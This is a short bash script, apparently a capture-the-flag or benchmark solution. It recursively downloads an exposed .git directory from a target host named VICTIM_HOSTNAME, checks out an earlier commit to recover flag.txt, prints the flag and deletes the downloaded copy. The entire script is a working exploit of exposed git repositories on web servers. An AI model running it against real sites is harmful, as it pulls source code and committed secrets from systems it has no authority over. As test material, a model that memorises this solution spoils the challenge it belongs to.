#!/bin/bash

./requirements.sh

until wget -q --recursive --no-parent http://$VICTIM_HOSTNAME:8080/.git/; do
    sleep 1
done
cd "$VICTIM_HOSTNAME:8080"
git checkout -q 4ba5380

echo "$(cat flag.txt)"

cd ..
rm -r "$VICTIM_HOSTNAME:8080"
